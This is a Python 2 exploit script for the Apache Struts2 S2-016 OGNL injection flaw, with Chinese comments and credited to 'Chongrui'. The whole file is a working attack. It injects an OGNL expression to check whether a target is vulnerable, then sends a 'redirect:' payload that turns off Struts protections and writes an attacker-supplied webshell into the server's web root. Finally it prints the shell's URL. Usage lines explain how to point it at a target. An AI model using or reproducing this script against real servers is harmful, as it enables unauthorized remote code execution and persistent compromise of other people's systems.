#coding=utf-8
import sys
import requests
'''Powered by Chongrui'''
class StrutsExploit():

	'''constructor'''
	def __init__(self,filepath,shellname):
		self.filepath = filepath
		self.shellname = shellname
		f = open(self.filepath,'r')
		self.payload = '''redirect:${{%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3dfalse%2c%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23a%3d%23context%5b%22com.opensymphony.xwork2.dispatcher.HttpServletRequest%22%5d%2c%23b%3dnew+java.io.FileOutputStream(new+java.lang.StringBuilder(%23a.getRealPath(%22/%22)).append(@java.io.File@separator).append(%22{shellname}%22))%2c%23b.write(%23a.getParameter("t").getBytes())%2c%23b.close%28%29%2c%23p%3d%23context%5b%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%5d.getWriter%28%29%2c%23p.println%28%22DONE%22%29%2c%23p.flush%28%29%2c%23p.close%28%29}}'''.format(shellname=self.shellname)
		self.detect_str = '''redirect:${%23p%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23p.println(%22HACKER%22),%23p.close()}'''
		self.webshell = f.read()
		f.close()

	'''获取shell的URL''' 
	def getShellPath(self,url):
		rawurl = url
		count = 0
		i = 0
		lineIndex = []
		url = url.replace('http://','')
		for x in url:
			if x == '/':
				lineIndex.append(i)
				count += 1
			if count == 2:
				break
			i += 1
		if len(lineIndex) != 2:
			proDir = ''
			partOne = partOne = rawurl[0:lineIndex[0]+7]	
		else:
			proDir = url[lineIndex[0]:lineIndex[1]]	
			partOne = rawurl[0:lineIndex[0]+7]	
		shellpath = "%s%s/%s" % (partOne,proDir,self.shellname)
		return shellpath


	'''检测是否存在漏洞'''
	def detect(self,url):
		url = "%s?%s" % (url,self.detect_str)
		try:
			r = requests.get(url,timeout=10)
			page_content = r.content
			if page_content.find('HACKER') != -1:
				return True
			else:
				return False
		except Exception, e:
			print '[+]Exploit Failed:',e
			return False

	'''攻击 上传shell到根目录'''
	def getshell(self,url):
		target_url = "%s?%s" % (url,self.payload)
		data = {'t':self.webshell}
		try:
			r = requests.post(target_url,data=data,timeout=10)
			page_content = r.content
			if page_content.find('DONE') != -1:
				print '[+]Exploit Success,shell location:\n%s' % self.getShellPath(url)
			else:
				print '[+]Exploit Failed'
		except Exception, e:
			print '[+]Exploit Failed:',e
			return

if __name__ == '__main__':
	if len(sys.argv) != 4:
		print '[+]Usage:python s2-016.py [target_url] [filename at your mechine] [shellname at remote host]'
		print '[+]Eg:python s2-016.py www.foo.com webshell.jsp system.jsp'
		sys.exit()
	url = sys.argv[1]
	filename = sys.argv[2]
	shellname = sys.argv[3]

	if not url.startswith('http://'):
		print '[+]URL is invalid!'
		sys.exit()
	print '[+]Target:%s' % url
	attacker = StrutsExploit(filename,shellname)
	if attacker.detect(url):
		print '[+]This website is vulnerable!'
	else:
		print '[+]Sorry,exploit failed!'
		sys.exit()
	attacker.getshell(url)
		


